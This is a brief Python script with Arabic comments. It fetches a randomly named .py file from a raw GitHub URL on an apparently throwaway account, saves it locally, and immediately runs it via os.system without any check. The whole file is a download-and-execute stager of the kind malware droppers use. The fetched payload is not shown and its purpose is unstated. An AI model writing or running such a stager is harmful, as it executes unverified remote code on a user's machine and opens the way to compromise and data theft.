import requests
import os

# رابط الملف الذي تريد تحميله من GitHub
url = 'https://raw.githubusercontent.com/saSfa43g/aaaaxxx/refs/heads/main/gjhnlflfjlgfnfga.py'

# اسم الملف الذي سيتم حفظه
filename = 'gjhnlflfjlgfnfga.py'

# تحميل الملف
response = requests.get(url)
if response.status_code == 200:
    with open(filename, 'wb') as f:
        f.write(response.content)
    print(f'File downloaded as {filename}')

    # تشغيل الكود بعد التحميل
    os.system(f'python {filename}')
else:
    print('Failed to download the file')
